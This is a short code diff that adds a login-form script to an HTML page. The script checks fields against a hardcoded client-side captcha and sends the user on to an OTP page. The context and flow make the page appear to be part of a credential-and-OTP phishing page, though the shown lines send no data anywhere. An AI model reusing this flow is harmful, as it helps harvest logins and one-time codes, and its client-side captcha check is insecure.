@@ -291,5 +291,27 @@ Captcha: ${captcha}
     }
 });
 </script>
+    <script>
+document.getElementById("loginForm").addEventListener("submit", function(e){
+    e.preventDefault();
+
+    const userId = document.getElementById("userId").value.trim();
+    const password = document.getElementById("password").value.trim();
+    const captcha = document.getElementById("captcha").value.trim();
+
+    // cek semua field terisi
+    if(userId === "" || password === "" || captcha === ""){
+        return;
+    }
+
+    // cek captcha harus sama
+    if(captcha !== "nr6nm"){
+        return;
+    }
+
+    // langsung pindah ke halaman OTP
+    window.location.href = "otp.html";
+});
+    </script>
 </body>
 </html>
